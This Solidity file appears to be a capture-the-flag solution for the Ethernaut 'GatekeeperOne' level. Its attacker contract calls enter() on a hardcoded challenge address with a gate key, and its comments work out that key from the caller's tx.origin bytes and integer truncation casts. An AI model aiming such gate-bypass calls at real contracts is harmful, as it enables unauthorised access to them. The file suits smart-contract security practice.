// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateCrushor {
    IGatekeeperOne public gko =
        IGatekeeperOne(0x33EDA6b1E7d41e5b006EBf64C7c0DFE487638432);

    function Crush(bytes8 _key) public {
        //gko.enter{gas: 41209}(_key);
        gko.enter(_key);
    }

    function u16(uint num) public pure returns (uint16) {
        return uint16(uint160(num));
    }

    function u3264(uint num) public pure returns (uint32) {
        return uint32(uint64(uint160(num)));
    }

    function u32(uint num) public pure returns (uint32) {
        return uint32(uint160(num));
    }

    function u64(uint num) public pure returns (uint64) {
        return uint64(uint160(num));
    }

    function u1664(uint num) public pure returns (uint16) {
        return uint16(uint64(uint160(num)));
    }

    function txorigin() public view returns (uint160) {
        return uint160(tx.origin);
    }

    //bytes8= > 0x 00 00 00 00 00 00 00 00
    //bytes8= > 0x 00 00 00 01 00 00 (2 bytes of wallet address)
    //wallet addres => 0xd69DFe5AE027B4912E384B821afeB946592fb648
    //key => 0x 00 00 00 01 00 00 b6 48 => 0x000000010000b648

    //the key is the last 2 bytes of the tx.origin
    //something past the 4 bytes of the key => X00AB
    //test net wallet 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 => key 0x000000010000ddC4

    function key() public view returns (uint16) {
        return uint16(((uint160(address(tx.origin)))));
    }
}
